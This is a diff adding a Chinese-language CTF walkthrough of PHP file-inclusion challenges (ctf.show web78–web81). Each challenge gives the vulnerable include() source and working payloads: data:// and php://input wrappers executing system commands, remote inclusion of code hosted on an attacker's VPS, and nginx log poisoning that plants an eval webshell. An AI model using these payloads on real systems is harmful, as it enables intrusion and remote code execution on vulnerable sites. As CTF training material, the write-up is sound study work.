@@ -718,6 +718,222 @@ payload：
 
 ![image-20241109165447576](assets/202411091654772.png)
 
+### **文件包含**
+
+> 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()
+
+#### Web78
+
+php伪协议
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 10:52:43
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 10:54:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+payload:
+
+> ?file=data://text/plain,<?php system("cat flag.php")?>
+
+查看源代码，得到flag
+
+![image-20241121192438056](./assets/image-20241121192438056.png)
+
+#### web79
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:10:14
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 11:12:38
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这题相对于上一题会将file中的php替换为???
+
+我们可以通过base64进行绕过
+
+```
+?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
+```
+
+or
+
+```
+?file=data://text/plain,<?=system('tac flag*');?> 
+
+?file=data://text/plain,<?Php echo `tac f*`;?>
+```
+
+or
+
+远程加载
+
+> 加载robots.txt，发现可以回显
+>
+> 在自己vps上创建1.txt，内容如下 `<?php system("tac flag.php");?>` 
+>
+> 起一个http服务，加载 `url/?file=http://x.x.x.x:7001/1.txt`
+
+or
+
+input协议 大小写绕过
+
+payload: 
+
+```
+POST /?file=Php://input HTTP/1.1
+
+<?Php system("cat flag.php");?>
+```
+
+#### web80
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 11:26:29
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+data协议被ban了
+
+可以用日志注入
+
+```
+GET /?file=/var/log/nginx/access.log HTTP/1.1
+Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
+Connection: close
+```
+
+写入一句话木马
+
+![image-20241121201547420](./assets/image-20241121201547420.png)
+
+连webshell工具或者直接get传参
+
+```
+?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();
+
+?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();
+```
+
+Or
+
+input协议 大小写绕过
+
+payload: 
+
+```
+POST /?file=Php://input HTTP/1.1
+
+<?Php system("cat flag.php");?>
+```
+
+#### ![image-20241121202826975](./assets/image-20241121202826975.png)
+
+#### web81
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 15:51:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+：被ban了
+
+用不了上题的input，但是还是可以用日志注入的
+
+写入木马
+
+![image-20241121203836225](./assets/image-20241121203836225.png)
+
+查flag
+
+![image-20241121204644174](./assets/image-20241121204644174.png)
+
+#### Web82
+
+
+
 ### **Java反序列化：**
 
 #### web846
